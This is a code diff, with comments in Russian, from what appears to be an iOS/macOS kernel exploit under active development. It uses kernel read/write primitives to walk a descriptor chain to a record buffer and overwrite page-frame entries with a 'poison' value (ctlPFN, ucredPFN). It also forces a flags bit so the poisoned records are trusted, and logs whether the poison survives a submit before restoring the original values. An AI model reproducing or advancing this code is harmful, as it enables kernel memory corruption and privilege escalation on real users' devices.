@@ -6298,6 +6298,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // паника назовёт адрес (x1), остальное не тронуто.
     uint64_t hitAddr[24], hitOld[24]; int hitForm[24];   // DEP-хиты уровня функции — форж перепатчит на ucredPFN (1.9.208)
     int nDep = 0;
+    uint64_t buf247 = 0, flOld247 = 0;   // 1.9.248: record buffer CHAIN + flags-оригинал — пост-submit дампы (H1 rebuild vs H2 mapper-игнор)
     // 1.9.247: CHAIN (р.61) — АВТОРИТЕТНЫЙ record buffer дескриптора, ноль сканов.
     // Цепочка: [surf+0x30]=pd → [pd+0x90]=hdr → [hdr+0x10]=buffer;
     // buffer+0x28=count (0x20=32 стр. для 512KB), +0x2d=flags(bit1=built),
@@ -6310,7 +6311,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint64_t vt247 = pd247 ? kp_untag_ptr(early_kread64(pd247)) : 0;
         uint64_t typ247 = pd247 ? (early_kread64(pd247 + 0x20) & 0xf0) : 0;
         uint64_t hdr247 = (typ247 == 0x10) ? kp_untag_ptr(early_kread64(pd247 + 0x90)) : 0;
-        uint64_t buf247 = hdr247 ? kp_untag_ptr(early_kread64(hdr247 + 0x10)) : 0;
+        buf247 = hdr247 ? kp_untag_ptr(early_kread64(hdr247 + 0x10)) : 0;
         uint32_t cnt247 = buf247 ? (uint32_t)early_kread64(buf247 + 0x28) : 0;
         uint8_t bfl247 = 0; if (buf247) kreadbuf(buf247 + 0x2d, &bfl247, 1);
         kpNote(r, [NSString stringWithFormat:@"  [CHAIN] pd=%#llx vt=%#llx type=%#llx hdr=%#llx buf=%#llx count=%#x flags=%#x — %@",
@@ -6331,6 +6332,17 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 uint64_t rb = early_kread64(buf247 + 0x30 + (uint64_t)i * 8);
                 kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
                 hitAddr[nDep] = buf247 + 0x30 + (uint64_t)i * 8; hitOld[nDep] = e; hitForm[nDep] = 5; nDep++;
+            }
+            // 1.9.248: форс records-built — в 247-м flags=0xc0 (bit1=0): сериализатор
+            // при fresh op ПЕРЕСТРАИВАЛ записи из источника и затирал яд (H1-гипотеза
+            // ctl-changed=0 ×3). Ставим bit1 — cached-путь обязан доверять буферу.
+            if (nDep && !(bfl247 & 0x02)) {
+                uint8_t fnew = bfl247 | 0x02;
+                usleep(1500);
+                flOld247 = early_kread64(buf247 + 0x28);
+                early_kwrite64(buf247 + 0x28, (flOld247 & ~(0xffULL << 40)) | ((uint64_t)fnew << 40));   // байт +0x2d = биты 40-47
+                uint8_t fck = 0; kreadbuf(buf247 + 0x2d, &fck, 1);
+                kpNote(r, [NSString stringWithFormat:@"  [CHAIN] форс records-built: flags %#x → %#x — %@", bfl247, fck, (fck & 0x02) ? @"ВСТАЛО" : @"МИМО"]);
             }
         }
     }
@@ -6393,15 +6405,15 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             hitAddr[nDep] = zva; hitOld[nDep] = q; hitForm[nDep] = 5; nDep++;
         }
     }
-    if (pfn32 && ctlPFN) {
+    if (pfn32 && ctlPFN && !nDep) {   // 1.9.248: CHAIN жив → DEP-диагностика не нужна (12с окна мины)
         uint64_t ftVA2 = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
         uint64_t totalPages2 = kconstant(physSize) >> 14;
         static uint8_t ftCh2[0x10000];
-        uint32_t frBudget = 100;   // 1.9.244: кап DEP-скану — 100 фреймов ≈ 12с; больше = чистое окно мины, хитов всё равно не было
-        for (uint64_t fb = 0; fb < totalPages2 && nDep < 24 && ftVA2 && frBudget; fb += 4096) {
+        int frBudget = 100;   // 1.9.248: SIGNED + проверка в ОБОИХ циклах — 1.9.244 uint32 wrap (0-1=UINT_MAX) дал 20558 фреймов = 2 мин окна мины
+        for (uint64_t fb = 0; fb < totalPages2 && nDep < 24 && ftVA2 && frBudget > 0; fb += 4096) {
             uint64_t nent = totalPages2 - fb; if (nent > 4096) nent = 4096;
             kreadbuf(ftVA2 + fb * 16, ftCh2, (size_t)(nent * 16));
-            for (uint64_t e = 0; e < nent && nDep < 24; e++) {
+            for (uint64_t e = 0; e < nent && nDep < 24 && frBudget > 0; e++) {
                 uint8_t t2 = ftCh2[e * 16 + 2];
                 // 1.9.220: скан ТОЛЬКО по {0x21,0x6,0xc} — выигрышный форма2-хит
                 // (1.9.207) был найден именно в этих типах; табличные {8,9,13,11}
@@ -6414,7 +6426,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 kpNote(r, [NSString stringWithFormat:@"  [DEP] читаю фрейм %#llx t=%#x", (unsigned long long)pa, t2]);
                 uint8_t pbuf2[0x4000];
                 kreadbuf(kva, pbuf2, sizeof(pbuf2));
-                frBudget--;
+                if (frBudget > 0) frBudget--;
                 for (uint32_t o = 0; o + 8 <= sizeof(pbuf2) && nDep < 24; o += 8) {
                     uint64_t q = 0; memcpy(&q, pbuf2 + o, 8);
                     // 1.9.242: детектор по СИГНАТУРЕ, без серии — page-list в этом
@@ -7534,6 +7546,18 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint64_t cur0 = nSlots ? early_kread64(slotVAs[0]) : 0;
         kpNote(r, [NSString stringWithFormat:@"  [RETRY #%d] submit kr=0x%x ctl-changed=%d слот#0=%#018llx",
                   attempt, rkr, changed, (unsigned long long)cur0]);
+        // 1.9.248: дамп record buffer ПОСЛЕ submit — решает H1/H2 из 247-й:
+        // entry0 вернулся к оригиналу = rebuild перезаписал яд (H1, источник
+        // глубже — wire-layer); entry0 == ctlPFN = mapper игнорирует буфер (H2).
+        if (buf247) {
+            uint8_t f2 = 0; kreadbuf(buf247 + 0x2d, &f2, 1);
+            uint64_t e0 = early_kread64(buf247 + 0x30);
+            uint64_t e1 = early_kread64(buf247 + 0x38);
+            kpNote(r, [NSString stringWithFormat:@"      buffer пост-submit: flags=%#x entry0=%#018llx entry1=%#018llx — %@",
+                      f2, (unsigned long long)e0, (unsigned long long)e1,
+                      (uint32_t)e0 == ctlPFN ? @"яд НА МЕСТЕ (H2: mapper мимо буфера)" :
+                      (uint32_t)e0 == pfn32 ? @"ОТКАТ в оригинал (H1: rebuild перезаписал — источник глубже)" : @"ТРЕТЬЕ ЗНАЧЕНИЕ"]);
+        }
         if (!changed) {
             for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], origQs[j]);
             for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
@@ -7547,6 +7571,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
     // 1.9.222: финальный restore spec (яд не живёт дольше теста)
     if (!changed) for (int k = 0; k < nSpec; k++) if (specOld[k]) early_kwrite64(specVA[k], specOld[k]);
+    // 1.9.248: финальный restore records-built flags (кворд +0x28 целиком — count не тронут)
+    if (buf247 && flOld247) early_kwrite64(buf247 + 0x28, flOld247);
     // 1.9.198: restore VA-поля буфера (teardown-safety)
     if (vaFldObj) {
         early_kwrite64(vaFldObj + vaFldOff, vaFldOld);
